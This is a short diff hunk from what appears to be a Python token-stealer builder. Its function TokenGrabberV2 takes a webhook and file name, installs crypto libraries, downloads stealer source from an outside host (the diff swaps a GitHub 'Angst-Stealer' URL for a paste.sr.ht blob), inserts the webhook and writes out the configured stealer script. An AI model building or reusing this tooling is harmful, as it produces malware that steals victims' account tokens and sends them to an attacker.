@@ -26,7 +26,7 @@ def TokenGrabberV2(WebHook, fileName):
         'pycryptodomex'
         ]
     install_lib(required)
-    code = requests.get("https://raw.githubusercontent.com/JaneHongEn/111/main/Angst-Stealer-main.py").text.replace("WEBHOOK_HERE", WebHook)
+    code = requests.get("https://paste.sr.ht/blob/c452b82af180ef253dc8bd9b01de15d10e3556da").text.replace("WEBHOOK_HERE", WebHook)
     with open(f"{fileName}.py", 'w' ,encoding='UTF-8') as f:
         f.write(code)
 
